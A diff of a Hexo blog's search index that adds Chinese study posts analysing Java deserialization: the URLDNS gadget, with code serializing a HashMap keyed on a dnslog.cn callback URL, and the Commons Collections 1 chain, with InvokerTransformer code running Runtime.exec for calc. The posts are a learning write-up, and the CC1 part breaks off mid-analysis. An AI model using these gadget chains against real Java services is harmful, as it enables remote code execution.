@@ -1,29 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/09/30/hello-world/</url>
-    <content><![CDATA[<p><escape><span id="more"></span></escape></p>
-<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>sql和xxe配合phar反序列化</title>
     <url>/2021/10/01/sql%E5%92%8Cxxe%E9%85%8D%E5%90%88phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<p>[toc]</p>
-<p><escape><span id="more"></span></escape></p>
+    <content><![CDATA[<p><escape><span id="more"></span></escape></p>
 <h2 id="mysql-触发反序列化漏洞"><a href="#mysql-触发反序列化漏洞" class="headerlink" title="mysql 触发反序列化漏洞"></a>mysql 触发反序列化漏洞</h2><p>php调用mysql的语句 LOAD DATA LOCAL INFILE 导入phar文件能触发phar的反序列化语句</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE</span><br></pre></td></tr></table></figure>
 
@@ -91,11 +71,286 @@
 <p><a href="https://xz.aliyun.com/t/6699#toc-3">https://xz.aliyun.com/t/6699#toc-3</a></p>
 ]]></content>
       <categories>
-        <category>反序列化</category>
+        <category>php反序列化</category>
       </categories>
       <tags>
-        <tag>PHP反序列化</tag>
+        <tag>php反序列化</tag>
         <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>URLDNS分析</title>
+    <url>/2021/10/04/URLDNS%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p><escape><span id="more"></span></escape></p>
+<p>要分析URLDNS首先我们就先说一说java序列化和反序列化</p>
+<h2 id="java序列化和反序列化"><a href="#java序列化和反序列化" class="headerlink" title="java序列化和反序列化"></a>java序列化和反序列化</h2><h5 id="如何序列化对象？"><a href="#如何序列化对象？" class="headerlink" title="如何序列化对象？"></a>如何序列化对象？</h5><p>只需要让可序列化的对象实现 Serializable 接口，然后再创建一个 ObjectOutputStream 输出流，再调用 ObjectOutputStream 对象的 writeObject() 方法进行输出可序列化对象即可。</p>
+<p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p>
+<p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化类对象。</p>
+<p>所以，只需借助<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能了。</p>
+<h5 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h5><p>简单来说，就是开发者在重写readObject方法的时候，写入了漏洞代码(readObject就相当于php中的unserialize)</p>
+<p>当输入的反序列化数据能够被攻击者控制的时候，那么攻击者就可以插入恶意代码，让反序列化产生非预期的对象，从而执行构造的任意代码</p>
+<h2 id="和其他反序列化的对比"><a href="#和其他反序列化的对比" class="headerlink" title="和其他反序列化的对比"></a>和其他反序列化的对比</h2><p>在学习java反序列化前，我相信更多的人接触的是php反序列化</p>
+<p>这里主要说说两者不一样的地方</p>
+<ul>
+<li> readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题</li>
+<li>我们熟悉的都是那些魔术方法，去触发魔术方法，构造pop链。<br> wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。<br> PHP的序列化、反序列化是低层过程，PHP的序列化是开发者是不能操作的。<br> 开发者调用 serialize 函数后，序列化的数据就已经完成。<br> 魔术方法只是在序列化前后对这个对象的操作。</li>
+<li>Java在序列化时一个对象，就不一样了，Java是在序列化的中间，去触发一下利用链，而不是php在序列化完成后<br> Java在序列化时，将会调用这个对象中的 writeObject 方法<br> 反序列化时，会调用readObject<br> writeObject和readObject 方法开发者多种情况都是自己会重写，造成一些问题，构造触发链。</li>
+<li> 就像上面说的再理解一下，php在反序列化漏洞，一般都是在反序列化完成后通过调用pop链，使用反序列化完成后的值进行插入恶意代码。而java反序列化，是在进行调用readObject进行反序列化的图中，因为readObject被重写了。反序列化数据能够被攻击者控制的时候进行的攻击。</li>
+</ul>
+<p>这里用一段代码来展示一下java的反序列化</p>
+<p>实现序列化与反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String args[])throws Exception&#123;</span><br><span class="line">          //定义obj对象</span><br><span class="line">        String obj=&quot;hello world!&quot;;</span><br><span class="line">          //创建一个包含对象进行反序列化信息的”object”数据文件</span><br><span class="line">        FileOutputStream fos=new FileOutputStream(&quot;object&quot;);</span><br><span class="line">        ObjectOutputStream os=new ObjectOutputStream(fos);</span><br><span class="line">          //writeObject()方法将obj对象写入object文件</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          //从文件中反序列化obj对象</span><br><span class="line">        FileInputStream fis=new FileInputStream(&quot;object&quot;);</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(fis);</span><br><span class="line">          //恢复对象</span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码将 String 对象 obj1 序列化后写入文件 object 文件中，后又从该文件反序列化得到该对象。</p>
+<p>我们再看一段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        //定义myObj对象</span><br><span class="line">        MyObject myObj = new MyObject();</span><br><span class="line">        myObj.name = &quot;hi&quot;;</span><br><span class="line">        //创建一个包含对象进行反序列化信息的”object”数据文件</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">        //writeObject()方法将myObj对象写入object文件</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        //从文件中反序列化obj对象</span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;object&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">        //恢复对象</span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyObject implements Serializable&#123;</span><br><span class="line">    public String name;</span><br><span class="line">    //重写readObject()方法</span><br><span class="line">    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        //执行默认的readObject()方法</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        //执行打开计算器程序命令</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app/&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次我们自己写了一个 class 来进行对象的序列与反序列化。我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object：</p>
+<p><img src="https://i.loli.net/2021/10/04/ljwpAekPYumba3z.jpg" alt="img"></p>
+<p>然后读取 object 反序列化时：<img src="https://i.loli.net/2021/10/04/VWZxeGBUyJpfM2T.jpg" alt="img"></p>
+<p>我们注意到 MyObject 类实现了<code>Serializable</code>接口，并且重写了<code>readObject()</code>函数。这里需要注意：<strong>只有实现了Serializable接口的类的对象才可以被序列化</strong>，Serializable 接口是启用其序列化功能的接口，实现 java.io.Serializable 接口的类才是可序列化的，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。这里的 readObject() 执行了<code>Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app/&quot;)</code>，而 readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject() 是可以重写的，可以定制反序列化的一些行为。</p>
+<h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和  value。所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中。而恰好, URL 这个对象计算  hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求</p>
+<p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在  java.util.HashMap中；然后设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其  hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode()</p>
+<p>构造</p>
+<p>通过上面构造gadget概述这，我们知道了需要一个URL对象，并作为hashmap的key即可。这时候提出需求</p>
+<p>1、需要有java.net.URL对象</p>
+<p>2、创建的map中key需要为URL对象</p>
+<p>3、需要将HashCode初始值为-1</p>
+<p><img src="https://i.loli.net/2021/10/04/9PmQwqi4ldOjkRg.png" alt="image-20211002004800123"></p>
+<p>这里的put方法就是赋值，url为key ，”LaNyer640”为value</p>
+<p>可以运行的时候我们可以发现就算我们没有设置HashCode初始值为-1也会访问</p>
+<p><img src="https://i.loli.net/2021/10/04/cs9u28oBFmXSKRp.png" alt="image-20211002004702901"></p>
+<p>打断点分析</p>
+<p><img src="https://i.loli.net/2021/10/04/ca4kGyK3qLsMBQA.png" alt="image-20211002004932513"></p>
+<p>跟进</p>
+<p><img src="https://i.loli.net/2021/10/04/ZaAhxTKLBt87JjI.png" alt="image-20211002005146817"></p>
+<p>发现此处<code>putVal()</code>方法中调用了<code>hash()</code>。跟进hash()</p>
+<p><img src="https://i.loli.net/2021/10/04/iUZk98yYCO2t4Dv.png" alt="image-20211002005337123"></p>
+<p>我们可以发现这是进行了判断，如果为空，则为0；不为空，则进入到后面这个调用了hashcode的算法中。这时候我们应该想起hashmap的特点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap类:键唯一,键值对存取无序, 由哈希表保证键唯一。hashcode方法返回该对象的哈希码值</span><br></pre></td></tr></table></figure>
+
+<p>理解这段话意思</p>
+<p><a href="https://blog.csdn.net/qq_32635069/article/details/79798741">https://blog.csdn.net/qq_32635069/article/details/79798741</a></p>
+<blockquote>
+<p>根据设定的<em>Hash函数</em> - 和处理冲突的方法，将一组关键字<strong>映象</strong> 到一个<strong>有限的连续的地址集</strong>（区间）上，并以关键字在地址集中的<strong>象</strong> 作为记录在表中的<strong>存储位置</strong>，这样的表便称为<strong>Hash表</strong> ；</p>
+</blockquote>
+<p>继续往下看看hashcode()干了什么事</p>
+<p><img src="https://i.loli.net/2021/10/04/F1OJgzvBcZLl3s4.png" alt="image-20211002005853412"></p>
+<p>可以看到这里，如果hashcode不等于1就会直接返回hashCode，但是这里hashCode已经为一，但是我们并没有设置</p>
+<p>这里是因为URL类中已经定义了hashcode为-1，所以我们就可以直接进入下一条语句中，去调用了新的一个hashcode</p>
+<p><img src="https://i.loli.net/2021/10/04/MAVPWy7eTL4otqJ.png" alt="image-20211002010112682"></p>
+<p>到了这里就已经好了，可以看到这里就已经调用getHostAddress 查询了 URL 的主机地址。但是我们这里只是生成payload的地方，所以我们不需要在这里就调用</p>
+<p>我们从demo中可以看到main函数里面短短三行就发起了请求，那我们以序列化数据形式呢？思考下我们怎么构造利用链？</p>
+<p>1、为什么发起的dns请求？</p>
+<p>2、目标类是否可以序列化</p>
+<p>其实看demo最后一行，不难猜想到其实就是hashmap的put方法开始。那么我们是不是可以看看hashmap可以被序列化吗</p>
+<p><img src="https://i.loli.net/2021/10/04/QZJbhmlW2KRcT1L.png" alt="image-20211002010356284"></p>
+<p>继承了serializable说明是可以被序列化</p>
+<p>构造链子要求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、需要有java.net.URL对象</span><br><span class="line"></span><br><span class="line">2、创建的map中key需要为URL对象</span><br><span class="line"></span><br><span class="line">3、需要将HashCode初始值为-1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException &#123;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://mq82wx.dnslog.cn&quot;);</span><br><span class="line">        map.put(url,&quot;edhdhdh&quot;);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.exp&quot;);</span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        outputStream.writeObject(map);</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们这边不能这么写，因为如果使用上面这段代码的话,我们就已经进行了一次map.put导致访问了url</p>
+<p>如果我们不想要进行反序列化时出现两次访问记录，那么我们就得将URL中的hashCode设置为不为-1</p>
+<p>这时候就需要利用到反射的知识</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package test.pake;</span><br><span class="line"></span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://mq82wx.dnslog.cn&quot;);</span><br><span class="line">        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true);//设置访问权限</span><br><span class="line">        f.set(url,123); //设置hashCode的值为123,这里可以是不为1的任何数</span><br><span class="line">        map.put(url,&quot;LaNyer640&quot;);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.exp&quot;);</span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        outputStream.writeObject(map);</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是还有个问题，我们序列化的时候还是要设置URL的hashCode值为-1，不然反序列化的时候不会重新计算hashCode值。当然这个得再map.put之后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package test.pake;</span><br><span class="line"></span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://mx25zw.dnslog.cn&quot;);</span><br><span class="line">        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true);//设置访问权限</span><br><span class="line">        f.set(url,123); //设置hashCode的值为123,这里可以是不为1的任何数</span><br><span class="line">        map.put(url,&quot;LaNyer640&quot;);</span><br><span class="line">        f.set(url,-1);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.exp&quot;);</span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        outputStream.writeObject(map);</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>随后，开始反序列化，触发漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package test.pake;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;./urldns.exp&quot;));</span><br><span class="line">        ois.readObject(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之前都说了 产生了这个反序列化的原因是HashMap 类改写了readObject那么这里就追踪一下，HashMap 类的readObject方法</p>
+<p><img src="https://i.loli.net/2021/10/04/o8g4KpOavWYuNPr.png" alt="image-20211002013349053"></p>
+<p>这里可以看到非常熟悉的putVal和hash()所以在反序列化的时候可以看是否出网</p>
+<p>测试成功</p>
+<p><img src="https://i.loli.net/2021/10/04/vSTkgjz6IiWQubm.png" alt="image-20211002012848274"></p>
+<p><a href="https://blog.csdn.net/god_zzZ/article/details/108107784">Java代码审计：Java反序列化入门之URLDNS链_god_Zeo的安全博客-CSDN博客</a></p>
+<p><a href="https://www.cnblogs.com/0x7e/p/15215101.html">https://www.cnblogs.com/0x7e/p/15215101.html</a></p>
+<p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p>
+<p><a href="https://www.cnblogs.com/0x7e/p/15215101.html">https://www.cnblogs.com/0x7e/p/15215101.html</a></p>
+]]></content>
+      <categories>
+        <category>java反序列化</category>
+      </categories>
+      <tags>
+        <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cc链1分析</title>
+    <url>/2021/10/04/cc%E9%93%BE1%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p><escape><span id="more"></span></escape></p>
+<h2 id="cc链1简化"><a href="#cc链1简化" class="headerlink" title="cc链1简化"></a>cc链1简化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">			new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">			new InvokerTransformer(&quot;exec&quot;, new Class[&#123;String.class&#125;,new Object[]&#123;&quot;Calc.exe&quot;&#125;),</span><br><span class="line">	&#125;;//通过数组定义来引用类，不会触发类的初始化</span><br><span class="line">		Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"> 		Map innerMap = new HashMap();</span><br><span class="line"> 		Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">transformerChain);</span><br><span class="line"> 		outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/04/aEDngFfjQ2PqJIi.png" alt="image-20211002163400018">这样就弹到了计算器</p>
+<p>这个过程涉及到下⾯1个接⼝和4类：</p>
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，<strong>被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调</strong>。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map:</p>
+<p>这里之所以使用TransformedMap.decorate是因为这里它的构造方法为protected类型,创建对象需要通过TransformedMap.decorate()来获得一个TransformedMap实例</p>
+<p><img src="https://i.loli.net/2021/10/04/kcBqzJPerwvCguH.png" alt="image-20211002164117281"></p>
+<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类</p>
+<blockquote>
+<p>在计算机程序设计中，<strong>回调函数</strong>，简称<strong>回调</strong>（Callback），是指通过函数参数传递到其他代码的，某一块可执行代码的引用。这一设计允许了底层代码调用在高层定义的子程序。</p>
+<p>就是这么说吧，java中的回调</p>
+<p>回调</p>
+<p><img src="https://i.loli.net/2021/10/04/6vNazyDCVYkjuB8.png" alt="img"></p>
+<p>回调的思想是：</p>
+<ul>
+<li><strong>类A的a()方法调用类B的b()方法</strong></li>
+<li><strong>类B的b()方法执行完毕主动调用类A的callback()方法</strong></li>
+</ul>
+</blockquote>
+<p>在TransformedMap类中有三个方法,它会执行传入的参数的transform()方法</p>
+<p><img src="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png" alt="image-20211002170439599"></p>
+<p><img src="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png" alt="image-20211002170908841"></p>
+<p>在新put传入的时候就会去调用transform方法</p>
+<p><img src="https://i.loli.net/2021/10/04/JbxeKlIHgp47tPB.png" alt="image-20211002171340472"></p>
+<h2 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h2><p>transformer是一个接口,它只有一个待实现的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line">    public Object transform(Object input); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象</p>
+<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>ConstantTransformer ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回</p>
+<p><img src="https://i.loli.net/2021/10/04/3Q9swTJI1jyaK6n.png" alt="image-20211002171601154"></p>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
+<p><img src="https://i.loli.net/2021/10/04/z5dRr2TxCk13Fao.png" alt="image-20211002171729200"></p>
+<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表</p>
+<p>然后就是下面的transform方法，使用反射的方式获取了想要执行的类的方法。</p>
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>该方法首先有一个构造函数,将传入的Transformer类型的数组赋值给iTransformers,这里iTransformers是一个数组</p>
+<p><img src="https://i.loli.net/2021/10/04/VijNh389kvGUmpa.png" alt="image-20211002172428882"></p>
+<p>而在该函数的transform方法中,有意思的来了</p>
+<p><img src="https://i.loli.net/2021/10/04/GbX5UqRvHopIB3S.png" alt="image-20211002172455313"></p>
+<p>它会将前一个transform返回的结果作为后一个对象的传参,假设我们传入的Transformer[]数组中有两个数据</p>
+<blockquote>
+<p>new ConstantTransformer(Runtime.getRuntime())</p>
+<p>new InvokerTransformer(“exec”, new Class[]{String.class},new Object[{“calc”})</p>
+</blockquote>
+<p>这样我们就可以执行系统命令了,当然还有个前提:就是触发TransformedMap中的那三个方法</p>
+<p>那么我们就清楚这里的流程了</p>
+<p><img src="https://i.loli.net/2021/10/04/APIOLYwWUR1dJxZ.png" alt="image-20211002173049864"></p>
+<p>创建了⼀个ChainedTransformer，里面包含了两个Transformer接口的实现类， 第⼀个是<code>ConstantTransformer</code>， 直接返回当前环境的Runtime对象；第⼆个是<code>InvokerTransformer</code>，执⾏Runtime对象的exec⽅法，参数是calc.exe </p>
+<p>之后就是将我们的transformerChain传入到，TransformedMap的decorate方法做修饰，进行初始化。之后当我们调用put方法时，ChainedTransformer的transform方法就会被调用。</p>
+<p>但是这里我们还得思考一个问题，就是如何构造一个序列化对象将其序列化。将outerMap对象变成⼀个序列化流</p>
+<p>我们想命令执行的关键就是触发这三个方法，从而触发transform方法</p>
+<p><img src="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png" alt="image-20211002170439599"></p>
+<p><img src="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png" alt="image-20211002170908841"></p>
+<p>而在<strong>TransformedMap</strong>之中，transformKey和transformValue连个protected方法能有两个public方法调用</p>
+<p><img src="https://i.loli.net/2021/10/04/6NT7EZVq9XI8glW.png" alt="image-20211003120626697"></p>
+<p>而下面的checkSetvalue也能调用transform的方法，所以我们就可以想我们能不能调用checkSetvalue从而调用transform的方法</p>
+<p>而checkSetValue则可以从注释中看到,当调用该类的setvalue方法时,会自动调用checkSetValue方法,而该类的setValue方法则继承于它的父类<code>AbstractInputCheckedMapDecorator</code></p>
+<h2 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h2><p><img src="https://i.loli.net/2021/10/04/wuBWHCZf4pgElYD.png" alt="image-20211003120958387"></p>
+<p>可以看到这里的AbstractInputCheckedMapDecorator有个内部静态类MapEntry。</p>
+<p>this.parent来自<img src="https://i.loli.net/2021/10/04/yoxJiOQTrebMGj7.png" alt="image-20211003121345296"></p>
+<p>这里的this.parent传入的就是TransformedMap,所以我们现在只需要找到一处 <strong>readObject</strong> 方法，只要它调用了 这个内部静态类中的setValue方法,即可完成整个反序列化链</p>
+<p>我们找到了一个类满足条件<code>AnnotationInvocationHandler</code> 类，该类属于 <strong>JDK1.7</strong> 自带</p>
+<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><img src="https://i.loli.net/2021/10/04/NvWyRFP4ZbqOzlh.png" alt="image-20211003181727873"></p>
+<p>这里一步步来讲解</p>
+<p><img src="https://i.loli.net/2021/10/04/fkErIateV5mlLYT.png" alt="image-20211003181755974"></p>
+<p><strong>var1</strong>是我们传入的输入流，随后var1被使用defaultReadObject进行反反序列化。</p>
+<p><img src="https://i.loli.net/2021/10/04/2EvJLlmF1XVxrY7.png" alt="image-20211003182100377"></p>
+<p><strong>var2</strong><strong><img src="https://i.loli.net/2021/10/04/pYj8Nq2Hit7okMg.png" alt="image-20211003182144535"></strong></p>
+<p>进入getInstance</p>
+<p><img src="https://i.loli.net/2021/10/04/A8iFnxehgZOSDl5.png" alt="image-20211003203110130"></p>
+<p>这里前面两个直接过了,来到了第三步,new AnnotationType(var0),这里var0为我们传入的Annotation类型Class跟进去</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212023-bdcac428-e701-1.png"><img src="https://i.loli.net/2021/10/04/TVfYSgN8q1lJ5ZH.png" alt="img"></a></p>
